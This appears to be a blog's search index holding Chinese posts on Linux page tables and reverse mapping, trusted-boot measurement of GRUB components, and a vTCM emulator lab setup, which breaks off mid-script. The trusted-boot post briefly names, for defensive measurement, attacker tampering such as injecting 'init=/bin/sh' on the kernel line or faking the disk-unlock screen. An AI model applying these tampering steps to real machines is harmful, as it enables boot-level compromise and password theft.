<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>linux内核学习</title>
    <link href="/2025/11/13/linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/11/13/linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="页">页</h1><h2 id="页表项（PTE）">页表项（PTE）</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251113165506677.png" alt="image-20251113165506677"></p><p>拆解后分两部分：</p><h3 id="1-PFN（物理页号）">(1) PFN（物理页号）</h3><p>就是哪个物理页，存放在 PTE 的高 52 位（细节依赖 CPU）。</p><p>物理地址 = PFN &lt;&lt; 12<br>（因为每页 4KB）</p><h3 id="2-flag-bits（权限-状态位）">(2) flag bits（权限/状态位）</h3><p>常见的标志位包括：</p><table><thead><tr><th>位</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>P</td><td>Present</td><td>是否在内存中</td></tr><tr><td>R/W</td><td>可写</td><td>是否允许写</td></tr><tr><td>U/S</td><td>用户态/内核态</td><td>是否允许用户态访问</td></tr><tr><td>NX</td><td>Non-Execute</td><td>是否禁止执行</td></tr><tr><td>A</td><td>Accessed</td><td>是否被访问</td></tr><tr><td>D</td><td>Dirty</td><td>是否被写过</td></tr><tr><td>PAT</td><td>caching mode</td><td>缓存策略</td></tr><tr><td>Global</td><td>全局页</td><td>TLB 不会在切换 CR3 时刷新</td></tr><tr><td>COW</td><td><em>Linux软件层标志</em></td><td>写时复制，内核组织在更高层 meta 信息</td></tr></tbody></table><p><strong>这些位让 CPU 知道如何处理对该页的内存访问。</strong></p><p>例：<br>PTE 中 R/W=0 → 页只读<br>PTE 中 NX=1 → 页不可执行<br>PTE 中 Present=0 → 页不在内存，引发 page fault，从 swap/load-in 再填充页表</p><h2 id="反向映射-RMAP-技术">反向映射(RMAP)技术</h2><h3 id="基本概念">基本概念</h3><ul><li><p><strong>正向映射</strong></p><p>当进程分配内存并发生写操作时，会分配虚拟地址并产生缺页,进而分配物理内存并建立虚拟地址到物理地址的映射关系， 这个叫正向映射。</p></li><li><p><strong>反向映射</strong></p><p>反过来， 通过物理页面找到映射它的所有虚拟页面叫反向映射（reverse-mapping, RMAP）。</p></li></ul><blockquote><p>为什么需要反向映射？ 主要是为了内存回收。在操作系统中，多个进程的虚拟地址可能映射到同一个物理页（例如共享内存、写时复制等）。当内核需要回收一个物理页时，它必须修改所有映射了该页的页表项，使其无效或指向其他位置。如果没有反向映射，内核将不得不遍历所有进程的页表来寻找映射，这是极其低效的。</p></blockquote><p><strong>Linux2.4没有反向映射</strong><br>在linux2.4内核中没有反向映射的这个概念，当时为了找到一个物理页面对应的页表项就需要遍历系统中所有的mm组成的链表，然后再遍历每一个mm的每一个vma看这个vma是否映射了这页，这个过程相当低效，最坏情况不得不遍历完所有的mm然后才能找映射到这个页的所有pte。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>可信启动流程</title>
    <link href="/2025/11/05/%E5%8F%AF%E4%BF%A1%E5%90%AF%E5%8A%A8%E4%B8%8E%E5%9F%BA%E5%87%86%E5%80%BC/"/>
    <url>/2025/11/05/%E5%8F%AF%E4%BF%A1%E5%90%AF%E5%8A%A8%E4%B8%8E%E5%9F%BA%E5%87%86%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<h1 id="可信启动">可信启动</h1><h2 id="基准值">基准值</h2><p>在一些硬件平台的实现中，<strong>初始平台度量值</strong>用来表示平台首次启动时的度量基线，这些初始值是由硬件厂商或系统集成商预设的，通常存储在TPM的<strong>非易失性存储区</strong>中。</p><h3 id="TCG规范">TCG规范</h3><h4 id="《TCG-PC-Client-Platform-Firmware-Profile-Specification》">《<strong>TCG PC Client Platform Firmware Profile Specification</strong>》</h4><ul><li><p>章节：<strong>7.4.1 Root of Trust for Measurement (RTM)</strong></p><blockquote><p>“The RTM is the component that performs the first measurement and extends it into a Platform Configuration Register (PCR).<br>The firmware code and configuration used by the RTM are defined at manufacture time and cannot be modified post-manufacture except by an authorized update process.”</p></blockquote><p>第一次度量动作（测量 Boot Block）由 <strong>出厂时定义的代码执行</strong>；</p><p>该代码及其基准（即被信任的初始哈希或签名公钥）在<strong>制造阶段写入</strong>；</p><p>后续不可随意更改，除非有授权更新（厂商签名更新 BIOS）。</p></li></ul><h3 id="国家标准">国家标准</h3><h4 id="《GM-T-0054-2018-可信计算平台-软件度量与验证规范》">《<strong>GM/T 0054-2018 可信计算平台 软件度量与验证规范</strong>》</h4><ul><li><p>第6章：</p><blockquote><p>“可信基准值由可信软件发布者或平台提供者在受控环境下计算产生，并在平台生产或初始化阶段写入可信平台控制模块或固件中。”</p></blockquote></li></ul><p>这些标准要求在<strong>设备制造时</strong>通过<strong>硬件信任根</strong>（例如芯片内的加密密钥和证书）进行最初的基准值写入，后续启动过程中的所有度量值都将与这些预设的基准值进行比对。</p><h3 id="硬件厂商标准">硬件厂商标准</h3><h4 id="Intel-BootGuard-Specification"><strong>Intel BootGuard Specification</strong></h4><blockquote><p>“Platform owners or OEMs fuse the Boot Policy Manifest (BPM) and hash of the BIOS public key into the Platform Controller Hub (PCH) Field Programmable Fuses (FPFs) at manufacturing time.”</p></blockquote><h3 id="AMD-Platform-Security-Processor-PSP"><strong>AMD Platform Security Processor (PSP)</strong></h3><blockquote><p>“The PSP verifies the initial BIOS image using a public key hash fused at manufacturing.<br>The key hash is programmed into the SoC fuses and cannot be modified after fabrication.”</p></blockquote><h2 id="系统启动流程">系统启动流程</h2><p>PSP核启动后加载PSP的bootloader，由bootloader做各种初始化，随后BootLoader</p><h2 id="关键组件和代码度量">关键组件和代码度量</h2><table><thead><tr><th style="text-align:center">关键组件</th></tr></thead><tbody><tr><td style="text-align:center">BIOS/U-BOOT</td></tr><tr><td style="text-align:center">PciRoot(0x0)/Pci(0x8,0x1)/Pci(0x0,0x2)/Sata(0x6,0xFFFF,0x0)/HD(1,GPT,D43E84F4-0E97-4488-91B3-8A727A8A9572,0x800,0x100000)/\EFI\ubuntu\grubx64.efi</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/normal.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/terminal.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/crypto.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/bufio.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/extcmd.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/boot.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/gettext.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/gzio.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/command.lst</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/fs.lst</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/crypto.lst</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/terminal.lst</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/grub.cfg</td></tr><tr><td style="text-align:center">grub_cmd: [ -s (hd1,gpt3)/boot/grub/grubenv ]</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/test.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/grubenv</td></tr><tr><td style="text-align:center">grub_cmd: load_env</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/loadenv.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/disk.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/grubenv</td></tr><tr><td style="text-align:center">grub_cmd: [  ]</td></tr><tr><td style="text-align:center">grub_cmd: set default=Advanced options for Ubuntu</td></tr><tr><td style="text-align:center">grub_cmd: [ xy = xy ]</td></tr><tr><td style="text-align:center">grub_cmd: menuentry_id_option=–id</td></tr><tr><td style="text-align:center">grub_cmd: export menuentry_id_option</td></tr><tr><td style="text-align:center">grub_cmd: font=unicode</td></tr><tr><td style="text-align:center">grub_cmd: loadfont unicode</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/font.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/video.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/fonts/unicode.pf2</td></tr><tr><td style="text-align:center">grub_cmd: set gfxmode=auto</td></tr><tr><td style="text-align:center">grub_cmd: load_video</td></tr><tr><td style="text-align:center">grub_cmd: insmod all_video</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/all_video.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/efi_gop.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/video_fb.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/efi_uga.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/video_bochs.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/video_cirrus.mod</td></tr><tr><td style="text-align:center">grub_cmd: insmod gfxterm</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/gfxterm.mod</td></tr><tr><td style="text-align:center">grub_cmd: set locale_dir=(hd1,gpt3)/boot/grub/local</td></tr><tr><td style="text-align:center">grub_cmd: set lang=en_US</td></tr><tr><td style="text-align:center">grub_cmd: insmod gettext</td></tr><tr><td style="text-align:center">grub_cmd: terminal_output gfxterm</td></tr><tr><td style="text-align:center">grub_cmd: set timeout_style=hidden</td></tr><tr><td style="text-align:center">grub_cmd: set timeout=2</td></tr><tr><td style="text-align:center">grub_cmd: [ -f (hd1,gpt3)/boot/grub/custom.cfg ]</td></tr><tr><td style="text-align:center">grub_cmd: setparams Advanced options for Ubuntu GN</td></tr><tr><td style="text-align:center">grub_cmd: setparams Ubuntu GNU/Linux, with Linux 5</td></tr><tr><td style="text-align:center">grub_cmd: load_video</td></tr><tr><td style="text-align:center">grub_cmd: insmod all_video</td></tr><tr><td style="text-align:center">grub_cmd: set gfxpayload=keep</td></tr><tr><td style="text-align:center">grub_cmd: insmod gzio</td></tr><tr><td style="text-align:center">grub_cmd: insmod part_gpt</td></tr><tr><td style="text-align:center">grub_cmd: insmod ext2</td></tr><tr><td style="text-align:center">grub_cmd: set root=hd0,gpt3</td></tr><tr><td style="text-align:center">grub_cmd: search --no-floppy --fs-uuid --set=root</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/search.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/search_fs_uuid.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/search_fs_file.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/search_label.mod</td></tr><tr><td style="text-align:center">grub_cmd: echo Loading Linux 5.10.112-hygon …</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/echo.mod</td></tr><tr><td style="text-align:center">grub_cmd: linux /boot/vmlinuz-5.10.112-hygon root=UUID</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/linux.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/relocator.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/mmap.mod</td></tr><tr><td style="text-align:center">/boot/vmlinuz-5.10.112-hygon</td></tr><tr><td style="text-align:center">kernel_cmdline: /boot/vmlinuz-5.10.112-hygon root=</td></tr><tr><td style="text-align:center">grub_cmd: echo Loading initial ramdisk …</td></tr><tr><td style="text-align:center">grub_cmd: initrd /boot/initrd.img-5.10.112-hygon</td></tr><tr><td style="text-align:center">/boot/initrd.img-5.10.112-hygon</td></tr><tr><td style="text-align:center"></td></tr></tbody></table><p><strong>1) 固件与设备路径（上电 → 固件）</strong></p><p>主板固件（BIOS/UEFI 或 U-Boot）启动后会做硬件初始化（CPU、内存、PCI 总线、存储控制器），然后按固件配置选择一个设备（比如哪个 SATA 端口、哪个 NVMe）来读取并执行第一级引导程序（例如 EFI 下的 bootloader）。固件还可能验证引导程序签名（Secure Boot）或按启动顺序选择设备。 上电后跑的代码是 BIOS/UEFI 或 U-Boot，它决定从哪块盘、哪条总线把引导器拉起来。固件被改了，后面所有东西都可能是假象。<code>BIOS/U-BOOT</code>、<code>PciRoot(...)/Sata(...)</code>、<code>(hd1,gpt3)</code> 就是这个层面的文件。</p><p><strong>2) 加载grub本体</strong></p><p>固件把 GRUB 的主可执行文件（例如 <code>EFI/BOOT/grubx64.efi</code> 或 <code>/boot/efi/.../grubx64.efi</code>）载入内存并运行。这一步会把 GRUB 的基础执行环境建立起来，准备加载 GRUB 的模块和配置文件。替换这个文件或它的签名会导致后续的启动甚至不是启动用户自己的操作系统。要度量的是 EFI 下的 grub 二进制和最早被加载的模块（ <code>.../boot/grub/x86_64-efi/...</code> ）。</p><p><strong>3) GRUB 模块加载</strong></p><p>GRUB 的很多功能并非内建在一个巨大的单体程序里，而是以模块（<code>.mod</code> 文件）形式存在。举例：<code>ext2</code> 模块实现读取 ext 分区，<code>search_fs_uuid.mod</code> 实现按 UUID 查分区，<code>linux.mod</code> 实现把内核映像加载到内存，<code>crypto.mod</code> 实现加密/解密支持，<code>gzio.mod</code> 实现 gzip 解压。GRUB 启动时按需 <code>insmod</code>（加载）这些模块来完成具体动作。</p><p>模块被替换能在很早就注入恶意行为，典型文件有 <code>linux.mod</code>, <code>disk.mod</code>, <code>search.mod</code>, <code>crypto.mod</code>, <code>gzio.mod</code>, <code>gfxterm.mod</code> 等。</p><p><strong>4) 配置与环境（grub.cfg / grubenv）</strong><br>实际要做什么、用什么参数启动，这些都写在 <code>grub.cfg</code> 或 <code>grubenv</code>。攻击者常用的手法不是改二进制，而是改脚本：偷偷加一条菜单、在 kernel 行加 <code>init=/bin/sh</code>。所以把这些文本文件和 GRUB 在启动时执行的命令记录当做度量对象很重要。</p><p><strong>5) 定位与读取（search / filesystem）</strong><br>GRUB 要先找到一个分区再去读文件。<code>search --fs-uuid</code>、part/FS 模块（<code>part_gpt</code>、<code>ext2</code>）和路径 <code>(hd1,gpt3)/boot/...</code> 是这一层的关键。这里被干的最简单也最常见：换盘、替换 <code>/boot/vmlinuz</code> 或 <code>/boot/initrd</code>。度量磁盘路径、search 模块和盘上这些文件，是检测文件级篡改的必做事。</p><p><strong>6) 内核与 initrd（权力移交点）</strong><br>当 GRUB 把内核（<code>vmlinuz-*</code>）和 initrd（<code>initrd.img-*</code>）加载并把命令行交给它们，控制权就转交了。内核或 initrd 被改，系统基本完蛋。一定要度量内核映像、initrd 和负责加载它们的模块（<code>relocator.mod</code>/<code>mmap.mod</code> 等）。</p><p><strong>7) 解密/UI/早期脚本（initrd、crypto、字体）</strong><br>如果有加密盘，GRUB 或 initrd 里会有解密逻辑；同时早期界面（<code>gfxterm</code>, <code>terminal</code>, 字体、<code>gettext</code>）是用户输入密码的点。攻击者常把这两者结合：伪造界面记录密码或用假 crypto 模块绕过解密。度量这些组件能防止口令泄露与解密被篡改。</p><h1 id="安全启动">安全启动</h1>]]></content>
    
    
    
    <tags>
      
      <tag>可信启动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟可信根实验</title>
    <link href="/2025/10/17/%E8%99%9A%E6%8B%9F%E5%8F%AF%E4%BF%A1%E6%A0%B9%E5%AE%9E%E9%AA%8C/"/>
    <url>/2025/10/17/%E8%99%9A%E6%8B%9F%E5%8F%AF%E4%BF%A1%E6%A0%B9%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="swtpm">swtpm</h1><h1 id="vTCM">vTCM</h1><p>新建一个项目根目录，我的项目根目录为/opt/build_vtcm/vtcm。</p><p>先把cube-1.3、cube-tcm和gm_sm2_master克隆到项目根目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://gitee.com/biparadox/cube-1.3.git<br>git clone https://gitee.com/biparadox/cube-tcm.git<br>git clone https://github.com/TCLab-BJUT/gm_sm2.git<br></code></pre></td></tr></table></figure><p>根据《tcm工程初步》中所说，cube-tcm 的环境变量设置方法必须在cube-1.3的环境变量设置完成后进行， 设置方法类似，脚本执行后，会修改CUBEAPPPATH和CUBE_APP_PLUGIN 到vtcm-1.12工作目录。编译前需完成国密算法库文件的复制和环境变量的设置。</p><h2 id="国密算法包编译">国密算法包编译</h2><p>进入gm_sm2目录后，执行命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd gm_sm2<br>make<br></code></pre></td></tr></table></figure><p>观察gm_sm2/bin目录，<a href="http://xn--libsm2So-nw7mw2bzzhjr5a55ija395c4yjh67gl8b138dkh7c.so">应可看到编译完成的动态库libsm2So.so</a>。此时国密算法包即编译完成。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205142843996.png" alt="image-20241205142843996"></p><p>下面将该库复制到cube-tcm的本地库目录cube-tcm/locallib/目录下。 cube-tcm 内部模块将会调用该库执行国密算法计算。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp ./bin/libsm2So.so ../cube-tcm/locallib/<br></code></pre></td></tr></table></figure><h2 id="cube-1-3环境变量设置">cube-1.3环境变量设置</h2><p>进入cube-1.3目录，并且完成编译环境配置</p><p>修改set_env.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ../cube-1.3<br>vi set_env.sh<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205103400314.png" alt="image-20241205103400314"></p><p>将此处修改为你cube-1.3所在路径，比如我的是<code>/opt/build_vtcm/vtcm/cube-1.3</code>，<mark>注意需要去掉`号！！！！</mark></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">编译环境设置</span><br>source set_env.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">cube架构的编译</span><br>sh env_build.sh<br></code></pre></td></tr></table></figure><p>编译爆警告是正常现象，没有报错就行。</p><p>完成编译后，如果以root权限登录，则可以直接运行cube实例；如果是以非root权限登录，应预先执行sudo dmidecode | grep UUID命令，获得uuid值，或自行为机器设置一个32字节的uuid值（可用随机数生成），而后在cube-1.3的proc/plugin目录下编辑一个名为uuid的文件，将UUID值填充到文件中，此时非root用户即可执行cube架构。</p><h2 id="cube-tcm环境变量设置">cube-tcm环境变量设置</h2><p>进入cube-tcm目录下，修改set_env.sh。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ../cube-tcm<br>vi set_env.sh<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205111312409.png" alt="image-20241205111312409"></p><p>同样的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">编译环境设置</span><br>source set_env.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">cube架构的编译</span><br>sh env_build.sh<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205111507541.png" alt="image-20241205111507541"></p><p>如果<code>sh env_build.sh</code>没有报错，那么模拟器编译成功，否则需要检查一下环境变量设置和算法库位置。</p><h2 id="设置-bashrc文件">设置.bashrc文件</h2><p>由于每次启动都得输入<code>source /opt/vtcm/cube-1.3/set_env.sh</code>和<code>source /opt/vtcm/cube-tcm/set_env.sh</code>，非常繁琐。所以我们把上面的命令写入.bashrc文件中，方便每次都自动完成设置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi /root/.bashrc<br></code></pre></td></tr></table></figure><p>进入.bashrc在最后一行添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /opt/vtcm/cube-1.3/set_env.sh<br>source /opt/vtcm/cube-tcm/set_env.sh<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205112905991.png" alt="image-20241205112905991"></p><h2 id="cube-tcm编译">cube-tcm编译</h2><p>安装tcm驱动并部署设备</p><p>我们在系统中启动两个终端term1和term2,确认两个终端均已完成环境变量配置。接下来在term1中打开驱动所在目录并执行make。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ./vtcm/cube-tcm/vtcm_dev<br>make<br>sudo ./load_vtcmd_dev.sh<br></code></pre></td></tr></table></figure><p>执行完毕后可以查看一下/dev中是否已经成功安装tcm设备和vtcm设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls /dev/*tcm*<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206172025753.png" alt="image-20241206172025753"></p><p>完成后打开模拟器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ../vtcm_netlink_emulator<br>./main_proc<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206172054961.png" alt="image-20241206172054961"></p><p>现在我们再转到term2。在term2的项目根目录中进入vtcm_utils目录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ./vtcm/cube-tcm/vtcm_utils<br></code></pre></td></tr></table></figure><p>该目录下是可信根应用实例的运行环境vtcm_utils。一个可信根需要通过与应用层的一个实例间的交互过程，来执行可信根的功能。</p><p>此时在vtcm_utils目录下执行（此处先不要运行）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./main_proc<br></code></pre></td></tr></table></figure><p>即可与vtcm_emulator 互联。</p><h2 id="TCM服务功能与操作实例">TCM服务功能与操作实例</h2><h3 id="初始化">初始化</h3><p>vtcm_utils缺省设为脚本操作，目录下有多个自动化脚本。我们这里使用交互模式来操作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep vtcm_auto *<br>sed -i &quot;s|vtcm_auto|vtcm_input|&quot; plugin_config.cfg<br>sed -i &quot;s|vtcm_auto|vtcm_input|&quot; router_policy.cfg<br></code></pre></td></tr></table></figure><p>将查找到的所有地方替换为vtcm_input，即可转入互动操作模式，如需换回脚本操作模式，则只要再用vtcm_auto替换掉vtcm_input即可。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205160235129.png" alt="image-20241205160235129"></p><p>此时直接执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./main_proc<br></code></pre></td></tr></table></figure><p>程序将进入等待命令状态。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205160343093.png" alt="image-20241205160343093"></p><p>生成背书密钥</p><p>cube-TCM里设置了一条背书密钥命令createek, 命令格式为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">createek –wf ekpub.key<br></code></pre></td></tr></table></figure><p>这里可信根命令的每个参数都由一个<code>-</code>打头的前缀来确定其类型。createek命令创建密钥后，会将密钥导出到ekpub.key文件中，在term2则可看到芯片输入输 出的二进制信息：</p><ul><li><p>输入信息是vtcm_utils根据芯片接口要求生成的数据包，如下所示：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206172300574.png" alt="image-20241206172300574"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206161832580.png" alt="image-20241206161832580"></p></li><li><p>输出信息则为vtcm_emulator收到数据包后，按照tcm标准运行后，返回的数据，如下所示：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206161913238.png" alt="image-20241206161913238"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206161926197.png" alt="image-20241206161926197"></p></li></ul><p>下面执行readpubek指令，该指令无输入参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">readpubek<br></code></pre></td></tr></table></figure><p>该命令从vtcm_emulater中获取可信根公钥，并在vtcm_utils内存中存放。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206172844362.png" alt="image-20241206172844362"></p><p>下一条指令是apcreate，这条指令用来创建应用和模拟器中对象的会话。初始化过程中，模拟器内部并没有合适的对象，因此apcreate命令将创建一个叫做 ET_NONE类型（编号为0x12）的会话，这一会话专用于初始化过程。 此时apcreate命令格式为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apcreate –it 12<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206210850769.png" alt="image-20241206210850769"></p><p>输出命令格式为</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206210910901.png" alt="image-20241206210910901"></p><p>此时vtcm_utils 和 vtcm_emulator 之间已经建立了一个会话。</p><p>下面是初始化过程中最关键的一个命令takeownership，该命令完成可信根属主口令的生成、可信根存储密钥以及根存储密钥口令的生成。属主口令用来获取可信根中属主的权限，可以进行用户鉴别密钥生成等操作。</p><p>命令的输入参数应包括属主口令、根存储密钥口令，也就是要自己设两个口令。</p><p>输入格式为：takeownership  -pwdo 用户口令 – pwds  smk口令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">takeownership -pwdo 123456 –pwds 123<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207152810390.png" alt="image-20241207152810390"></p><p>在term1中可看到成功拿到句柄</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207152852669.png" alt="image-20241207152852669"></p><p>takeownership 命令执行成功后，将在TCM中创建存储根密钥smk,其实 体类型值为04。我们可以通过用apcreate命令创建vtcm_utils和smk的会话 来验证takeownership 是否成功。测试命令为apcreate  -it 04 -pwd  smk口令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apcreate -it 04 -pwd 123<br></code></pre></td></tr></table></figure><p>下面为测试命令的输出内容，我们可以看到两个返回值，第一个是命令返回码，其取值为0，表示执行正确，第二个则是apcreate命令与smk之间建立可信会话连接的会话句柄。这表示takeownership命令执行正确。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207153121633.png" alt="image-20241207153121633"></p><p>而如果我们输入错误的smk口令或者省略了-pwd选项，则我们应该在命令最 后得到下面的结果：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207153215303.png" alt="image-20241207153215303"></p><h3 id="初始化自动化脚本">初始化自动化脚本</h3><p>下面附上我自己写的脚本（<mark>注意，我是在Windows上写的，Linux识别Windows的换行符会识别成字符，请先测试一下再实际使用</mark>）</p><p>在项目根目录下创建四个shell文件：</p><ol><li><p>build_vctm.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>mkdir vtcm<br>cd vtcm<br>git clone 